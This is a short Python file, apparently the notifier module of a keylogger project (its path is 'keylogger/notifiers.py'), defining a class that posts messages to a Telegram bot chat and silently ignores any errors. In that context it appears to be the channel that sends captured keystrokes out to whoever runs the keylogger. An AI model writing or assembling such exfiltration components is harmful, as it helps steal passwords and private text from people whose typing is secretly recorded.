# keylogger/notifiers.py
import requests

class TelegramNotifier:
    def __init__(self, token, chat_id):
        self.token = token
        self.chat_id = chat_id
        self.enabled = bool(token and chat_id)

    def send(self, message):
        if not self.enabled:
            return
        try:
            url = f"https://api.telegram.org/bot{self.token}/sendMessage"
            data = {"chat_id": self.chat_id, "text": message}
            requests.post(url, data=data, timeout=5)
        except Exception:
            pass